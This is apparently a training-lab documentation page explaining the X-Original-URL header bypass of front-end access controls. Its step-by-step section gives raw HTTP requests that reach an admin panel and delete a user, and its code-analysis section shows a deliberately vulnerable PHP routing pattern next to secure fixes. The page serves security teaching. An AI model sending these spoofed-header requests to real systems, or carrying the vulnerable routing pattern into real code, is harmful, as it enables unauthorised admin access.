<?php
session_start();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Documentation - URL-based Access Control Bypass</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a0a0a 100%);
            min-height: 100vh;
            color: #e0e0e0;
        }
        .header {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border-bottom: 1px solid rgba(255, 68, 68, 0.3);
            padding: 1rem 2rem;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            z-index: 100;
        }
        .header-content {
            max-width: 1400px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .logo {
            font-size: 1.5rem;
            font-weight: bold;
            color: #ff4444;
            text-decoration: none;
        }
        .nav-links {
            display: flex;
            gap: 1.5rem;
            align-items: center;
        }
        .nav-links a {
            color: #e0e0e0;
            text-decoration: none;
            font-weight: 500;
            transition: color 0.3s;
        }
        .nav-links a:hover { color: #ff4444; }
        .btn-nav {
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            padding: 0.5rem 1rem;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 68, 68, 0.3);
            color: #e0e0e0;
            text-decoration: none;
            border-radius: 6px;
            transition: all 0.3s;
        }
        .btn-nav:hover {
            background: rgba(255, 68, 68, 0.2);
            border-color: #ff4444;
            color: #ff4444;
        }
        .layout {
            display: flex;
            margin-top: 60px;
        }
        .sidebar {
            width: 280px;
            background: rgba(255, 255, 255, 0.02);
            border-right: 1px solid rgba(255, 68, 68, 0.1);
            padding: 2rem 1rem;
            position: fixed;
            top: 60px;
            bottom: 0;
            overflow-y: auto;
        }
        .sidebar h3 {
            color: #ff4444;
            font-size: 0.9rem;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 1rem;
            padding-left: 1rem;
        }
        .sidebar-nav {
            list-style: none;
        }
        .sidebar-nav li a {
            display: block;
            padding: 0.7rem 1rem;
            color: #888;
            text-decoration: none;
            border-radius: 6px;
            transition: all 0.3s;
            font-size: 0.95rem;
        }
        .sidebar-nav li a:hover,
        .sidebar-nav li a.active {
            background: rgba(255, 68, 68, 0.1);
            color: #ff4444;
        }
        .main-content {
            flex: 1;
            margin-left: 280px;
            padding: 3rem;
            max-width: calc(100% - 280px);
        }
        .doc-section {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 68, 68, 0.1);
            border-radius: 15px;
            padding: 2.5rem;
            margin-bottom: 2rem;
        }
        .doc-section h1 {
            color: #ff4444;
            font-size: 2rem;
            margin-bottom: 1.5rem;
            padding-bottom: 1rem;
            border-bottom: 1px solid rgba(255, 68, 68, 0.2);
        }
        .doc-section h2 {
            color: #ff6666;
            font-size: 1.5rem;
            margin: 2rem 0 1rem 0;
        }
        .doc-section h3 {
            color: #ff8888;
            font-size: 1.2rem;
            margin: 1.5rem 0 1rem 0;
        }
        .doc-section p {
            color: #b0b0b0;
            line-height: 1.8;
            margin-bottom: 1rem;
        }
        .doc-section ul, .doc-section ol {
            color: #b0b0b0;
            line-height: 1.8;
            margin-left: 1.5rem;
            margin-bottom: 1rem;
        }
        .doc-section li {
            margin-bottom: 0.5rem;
        }
        .code-block {
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(255, 68, 68, 0.2);
            border-radius: 8px;
            padding: 1.2rem;
            margin: 1rem 0;
            overflow-x: auto;
        }
        .code-block pre {
            color: #ff6666;
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 0.9rem;
            line-height: 1.6;
            margin: 0;
        }
        .code-inline {
            background: rgba(255, 68, 68, 0.1);
            color: #ff6666;
            padding: 0.2rem 0.5rem;
            border-radius: 4px;
            font-family: 'Consolas', monospace;
            font-size: 0.9em;
        }
        .alert {
            padding: 1.2rem;
            border-radius: 10px;
            margin: 1.5rem 0;
        }
        .alert-info {
            background: rgba(68, 68, 255, 0.1);
            border: 1px solid rgba(68, 68, 255, 0.3);
        }
        .alert-info h4 { color: #6666ff; margin-bottom: 0.5rem; }
        .alert-info p { color: #a0a0ff; margin: 0; }
        .alert-warning {
            background: rgba(255, 200, 68, 0.1);
            border: 1px solid rgba(255, 200, 68, 0.3);
        }
        .alert-warning h4 { color: #ffcc44; margin-bottom: 0.5rem; }
        .alert-warning p { color: #ffdd88; margin: 0; }
        .alert-danger {
            background: rgba(255, 68, 68, 0.1);
            border: 1px solid rgba(255, 68, 68, 0.3);
        }
        .alert-danger h4 { color: #ff4444; margin-bottom: 0.5rem; }
        .alert-danger p { color: #ff8888; margin: 0; }
        .alert-success {
            background: rgba(68, 255, 68, 0.1);
            border: 1px solid rgba(68, 255, 68, 0.3);
        }
        .alert-success h4 { color: #44ff44; margin-bottom: 0.5rem; }
        .alert-success p { color: #88ff88; margin: 0; }
        .table-container {
            overflow-x: auto;
            margin: 1rem 0;
        }
        .doc-table {
            width: 100%;
            border-collapse: collapse;
        }
        .doc-table th, .doc-table td {
            padding: 1rem;
            text-align: left;
            border-bottom: 1px solid rgba(255, 68, 68, 0.1);
        }
        .doc-table th {
            background: rgba(255, 68, 68, 0.1);
            color: #ff6666;
            font-weight: 600;
        }
        .doc-table td {
            color: #b0b0b0;
        }
        .step-number {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 1.8rem;
            height: 1.8rem;
            background: linear-gradient(135deg, #ff4444, #cc0000);
            border-radius: 50%;
            color: white;
            font-weight: bold;
            font-size: 0.85rem;
            margin-right: 0.5rem;
        }
    </style>
</head>
<body>
    <header class="header">
        <div class="header-content">
            <a href="index.php" class="logo">🏢 SecureCorp</a>
            <nav class="nav-links">
                <a href="../index.php" class="btn-nav">← All Labs</a>
                <a href="index.php">Home</a>
                <a href="lab-description.php">Lab Info</a>
                <?php if (isset($_SESSION['user_id'])): ?>
                    <a href="profile.php">My Account</a>
                    <a href="logout.php">Logout</a>
                <?php else: ?>
                    <a href="login.php">Login</a>
                <?php endif; ?>
            </nav>
        </div>
    </header>

    <div class="layout">
        <aside class="sidebar">
            <h3>Documentation</h3>
            <ul class="sidebar-nav">
                <li><a href="#overview" class="active">Overview</a></li>
                <li><a href="#vulnerability">Vulnerability</a></li>
                <li><a href="#exploitation">Exploitation</a></li>
                <li><a href="#step-by-step">Step-by-Step Guide</a></li>
                <li><a href="#code-analysis">Code Analysis</a></li>
                <li><a href="#prevention">Prevention</a></li>
                <li><a href="#comparison">Code Comparison</a></li>
                <li><a href="#references">References</a></li>
            </ul>
            <h3 style="margin-top: 2rem;">Quick Links</h3>
            <ul class="sidebar-nav">
                <li><a href="index.php">🏠 Lab Home</a></li>
                <li><a href="login.php">🔐 Login Page</a></li>
                <li><a href="lab-description.php">📋 Lab Description</a></li>
            </ul>
        </aside>

        <main class="main-content">
            <section id="overview" class="doc-section">
                <h1>🏢 URL-based Access Control Bypass</h1>
                <p>
                    This documentation covers the X-Original-URL header bypass vulnerability, which allows attackers 
                    to circumvent front-end access controls by exploiting how back-end applications process URL headers.
                </p>

                <div class="alert alert-info">
                    <h4>💡 Lab Objective</h4>
                    <p>Access the admin panel (blocked by front-end) using the X-Original-URL header and delete the user "carlos".</p>
                </div>

                <h2>Lab Credentials</h2>
                <div class="table-container">
                    <table class="doc-table">
                        <thead>
                            <tr>
                                <th>Username</th>
                                <th>Password</th>
                                <th>Role</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td><span class="code-inline">wiener</span></td>
                                <td><span class="code-inline">peter</span></td>
                                <td>Regular User</td>
                            </tr>
                            <tr>
                                <td><span class="code-inline">carlos</span></td>
                                <td><span class="code-inline">montoya123</span></td>
                                <td>Target User</td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </section>

            <section id="vulnerability" class="doc-section">
                <h1>🔍 Vulnerability Details</h1>
                
                <h2>What is URL-based Access Control Bypass?</h2>
                <p>
                    Some applications enforce access controls at the front-end layer (reverse proxy, WAF, or load balancer) 
                    by blocking requests to certain URL paths like <span class="code-inline">/admin</span>. However, if the 
                    back-end application processes certain HTTP headers to determine the actual URL, these controls can be bypassed.
                </p>

                <h2>The X-Original-URL Header</h2>
                <p>
                    The <span class="code-inline">X-Original-URL</span> header (and similar headers like 
                    <span class="code-inline">X-Rewrite-URL</span>) is used by some frameworks and reverse proxies to 
                    preserve the original requested URL before any URL rewriting occurs.
                </p>
                
                <div class="code-block">
                    <pre># Normal request (blocked by front-end)
GET /admin HTTP/1.1
Host: target.com
→ 403 Forbidden

# Bypass using X-Original-URL
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin
→ 200 OK (Admin panel!)</pre>
                </div>

                <h2>Why This Happens</h2>
                <ul>
                    <li><strong>Architecture mismatch</strong> - Front-end and back-end interpret requests differently</li>
                    <li><strong>Framework behavior</strong> - Some frameworks (Spring, certain IIS configs) process these headers</li>
                    <li><strong>Trust assumption</strong> - Back-end trusts headers that should be internal only</li>
                    <li><strong>URL normalization</strong> - Different URL parsing between components</li>
                </ul>

                <div class="alert alert-warning">
                    <h4>⚠️ Real-World Impact</h4>
                    <p>This vulnerability has been found in production systems using Spring Framework, Microsoft IIS with URL Rewrite module, and various reverse proxy configurations.</p>
                </div>
            </section>

            <section id="exploitation" class="doc-section">
                <h1>⚡ Exploitation</h1>

                <h2>Attack Flow</h2>
                <div class="code-block">
                    <pre>1. Try accessing /admin directly → 403 Forbidden
2. Notice plain response (front-end block)
3. Test X-Original-URL: /invalid with GET / → 404 Not Found
4. Confirm back-end processes the header
5. Use X-Original-URL: /admin with GET / → Admin Panel!
6. Delete carlos: GET /?username=carlos with X-Original-URL: /admin/delete</pre>
                </div>

                <h2>Bypass Technique</h2>
                <p>The key insight is that the front-end checks the actual URL path (<span class="code-inline">/admin</span>), 
                but the back-end uses the <span class="code-inline">X-Original-URL</span> header to determine routing:</p>
                
                <div class="code-block">
                    <pre># Step 1: Access admin panel
GET / HTTP/1.1
Host: localhost
X-Original-URL: /admin

# Step 2: Delete carlos (query params go in real URL)
GET /?username=carlos HTTP/1.1
Host: localhost
X-Original-URL: /admin/delete</pre>
                </div>

                <div class="alert alert-danger">
                    <h4>🚨 Important Note</h4>
                    <p>Query parameters must be placed in the actual request URL, not in the X-Original-URL header. The header only specifies the path for routing.</p>
                </div>
            </section>

            <section id="step-by-step" class="doc-section">
                <h1>📖 Step-by-Step Guide</h1>

                <p><span class="step-number">1</span><strong>Attempt direct admin access</strong></p>
                <p>Try navigating to <span class="code-inline">/admin</span> directly. You'll receive a 403 Forbidden response.</p>

                <p><span class="step-number">2</span><strong>Analyze the response</strong></p>
                <p>Notice the response is plain and simple - this suggests it comes from a front-end proxy, not the application.</p>

                <p><span class="step-number">3</span><strong>Test header processing</strong></p>
                <p>Send a request to <span class="code-inline">/</span> with header <span class="code-inline">X-Original-URL: /invalid</span></p>
                
                <div class="code-block">
                    <pre>GET / HTTP/1.1
Host: localhost
X-Original-URL: /invalid</pre>
                </div>
                
                <p>If you get a 404 "not found", the back-end is processing the header!</p>

                <p><span class="step-number">4</span><strong>Access admin panel</strong></p>
                <p>Change the header to <span class="code-inline">X-Original-URL: /admin</span></p>
                
                <div class="code-block">
                    <pre>GET / HTTP/1.1
Host: localhost
X-Original-URL: /admin</pre>
                </div>

                <p><span class="step-number">5</span><strong>Delete carlos</strong></p>
                <p>To delete a user, you need to call the delete endpoint with the username parameter:</p>
                
                <div class="code-block">
                    <pre>GET /?username=carlos HTTP/1.1
Host: localhost
X-Original-URL: /admin/delete</pre>
                </div>

                <div class="alert alert-success">
                    <h4>✅ Success Criteria</h4>
                    <p>The lab is solved when you successfully delete the user "carlos" using the X-Original-URL header bypass.</p>
                </div>
            </section>

            <section id="code-analysis" class="doc-section">
                <h1>🔬 Code Analysis</h1>

                <h2>Vulnerable Code Pattern</h2>
                <div class="code-block">
                    <pre>&lt;?php
// VULNERABLE: Back-end processes X-Original-URL header

// Simulate front-end blocking
$requestUri = $_SERVER['REQUEST_URI'];
$originalUrl = $_SERVER['HTTP_X_ORIGINAL_URL'] ?? null;

// Front-end would block /admin in REQUEST_URI
// But back-end uses X-Original-URL for routing!

if ($originalUrl) {
    // VULNERABLE: Using header for routing decisions
    $routePath = $originalUrl;
} else {
    $routePath = $requestUri;
}

// Route based on potentially spoofed header
if ($routePath === '/admin') {
    include 'admin_panel.php';  // Access granted via bypass!
}
?&gt;</pre>
                </div>

                <h2>Security Issues</h2>
                <ul>
                    <li><strong>Header trust</strong> - Trusting client-supplied headers for security decisions</li>
                    <li><strong>Architecture mismatch</strong> - Front-end and back-end have different URL views</li>
                    <li><strong>No back-end authorization</strong> - Relying solely on front-end access control</li>
                    <li><strong>Missing authentication</strong> - Admin panel accessible without login</li>
                </ul>
            </section>

            <section id="prevention" class="doc-section">
                <h1>🛡️ Prevention</h1>

                <h2>Secure Code Pattern</h2>
                <div class="code-block">
                    <pre>&lt;?php
// SECURE: Never trust X-Original-URL from clients

// Option 1: Strip/ignore these headers
unset($_SERVER['HTTP_X_ORIGINAL_URL']);
unset($_SERVER['HTTP_X_REWRITE_URL']);

// Option 2: Only accept from trusted proxies
$trustedProxies = ['10.0.0.1', '192.168.1.1'];
if (!in_array($_SERVER['REMOTE_ADDR'], $trustedProxies)) {
    unset($_SERVER['HTTP_X_ORIGINAL_URL']);
}

// Option 3: Implement proper back-end authorization
function checkAdminAccess() {
    if (!isset($_SESSION['user_id'])) {
        return false;
    }
    
    // Verify user has admin role
    $stmt = $conn->prepare("SELECT role FROM users WHERE id = ?");
    $stmt->bind_param("i", $_SESSION['user_id']);
    $stmt->execute();
    $user = $stmt->get_result()->fetch_assoc();
    
    return $user && $user['role'] === 'admin';
}

// Always check authorization at back-end
if (!checkAdminAccess()) {
    http_response_code(403);
    die("Access denied");
}
?&gt;</pre>
                </div>

                <h2>Best Practices</h2>
                <ul>
                    <li><strong>Defense in depth</strong> - Implement authorization at EVERY layer, not just front-end</li>
                    <li><strong>Strip dangerous headers</strong> - Remove X-Original-URL, X-Rewrite-URL at the edge</li>
                    <li><strong>Trusted proxy validation</strong> - Only accept these headers from known internal IPs</li>
                    <li><strong>Back-end authorization</strong> - Always verify permissions in application code</li>
                    <li><strong>Framework configuration</strong> - Disable X-Original-URL processing if not needed</li>
                </ul>

                <div class="alert alert-danger">
                    <h4>🚫 Never Do This</h4>
                    <p>Never rely solely on front-end access controls (WAF, reverse proxy rules) for sensitive functionality. Always implement authorization checks in the back-end application.</p>
                </div>
            </section>

            <section id="comparison" class="doc-section">
                <h1>⚖️ Code Comparison</h1>

                <h2>Vulnerable Implementation</h2>
                <div class="code-block">
                    <pre>&lt;?php
// ❌ VULNERABLE: Trusts X-Original-URL header
$originalUrl = $_SERVER['HTTP_X_ORIGINAL_URL'] ?? null;

// No authentication check
// No authorization verification
// Front-end access control only

if (strpos($originalUrl, '/admin') !== false) {
    // Admin access granted without any verification!
    showAdminPanel();
}
?&gt;</pre>
                </div>

                <h2>Secure Implementation</h2>
                <div class="code-block">
                    <pre>&lt;?php
// ✅ SECURE: Proper authorization

// 1. Strip untrusted headers
if (!isRequestFromTrustedProxy()) {
    unset($_SERVER['HTTP_X_ORIGINAL_URL']);
}

// 2. Require authentication
if (!isset($_SESSION['user_id'])) {
    redirectToLogin();
    exit;
}

// 3. Verify authorization
$user = getUserById($_SESSION['user_id']);
if ($user['role'] !== 'admin') {
    http_response_code(403);
    die("Admin access required");
}

// 4. Only then show admin panel
showAdminPanel();
?&gt;</pre>
                </div>

                <h2>Key Differences</h2>
                <div class="table-container">
                    <table class="doc-table">
                        <thead>
                            <tr>
                                <th>Aspect</th>
                                <th>Vulnerable</th>
                                <th>Secure</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td>Header Trust</td>
                                <td>Trusts X-Original-URL blindly</td>
                                <td>Strips/validates header source</td>
                            </tr>
                            <tr>
                                <td>Authentication</td>
                                <td>None required</td>
                                <td>Session validation required</td>
                            </tr>
                            <tr>
                                <td>Authorization</td>
                                <td>Front-end only</td>
                                <td>Back-end role verification</td>
                            </tr>
                            <tr>
                                <td>Defense Layers</td>
                                <td>Single layer (proxy)</td>
                                <td>Multiple layers</td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </section>

            <section id="references" class="doc-section">
                <h1>📚 References</h1>

                <h2>Related Vulnerabilities</h2>
                <ul>
                    <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema" style="color: #ff4444;">OWASP - Bypassing Authorization Schema</a></li>
                    <li><a href="https://cwe.mitre.org/data/definitions/284.html" style="color: #ff4444;">CWE-284: Improper Access Control</a></li>
                    <li><a href="https://cwe.mitre.org/data/definitions/639.html" style="color: #ff4444;">CWE-639: Authorization Bypass Through User-Controlled Key</a></li>
                </ul>

                <h2>Related Headers</h2>
                <ul>
                    <li><span class="code-inline">X-Original-URL</span> - Original URL before rewrite</li>
                    <li><span class="code-inline">X-Rewrite-URL</span> - Similar purpose, used by IIS</li>
                    <li><span class="code-inline">X-Forwarded-For</span> - Original client IP (also often spoofable)</li>
                    <li><span class="code-inline">X-Forwarded-Host</span> - Original Host header</li>
                </ul>

                <h2>Further Reading</h2>
                <ul>
                    <li><a href="https://portswigger.net/web-security/access-control" style="color: #ff4444;">PortSwigger - Access Control Vulnerabilities</a></li>
                    <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html" style="color: #ff4444;">OWASP Authorization Cheat Sheet</a></li>
                </ul>
            </section>
        </main>
    </div>

    <script>
        document.querySelectorAll('.sidebar-nav a').forEach(link => {
            link.addEventListener('click', function(e) {
                if (this.getAttribute('href').startsWith('#')) {
                    e.preventDefault();
                    const target = document.querySelector(this.getAttribute('href'));
                    if (target) {
                        target.scrollIntoView({ behavior: 'smooth' });
                    }
                    document.querySelectorAll('.sidebar-nav a').forEach(l => l.classList.remove('active'));
                    this.classList.add('active');
                }
            });
        });

        window.addEventListener('scroll', () => {
            const sections = document.querySelectorAll('.doc-section');
            let current = '';
            sections.forEach(section => {
                const sectionTop = section.offsetTop;
                if (scrollY >= sectionTop - 100) {
                    current = section.getAttribute('id');
                }
            });
            document.querySelectorAll('.sidebar-nav a').forEach(link => {
                link.classList.remove('active');
                if (link.getAttribute('href') === '#' + current) {
                    link.classList.add('active');
                }
            });
        });
    </script>
</body>
</html>
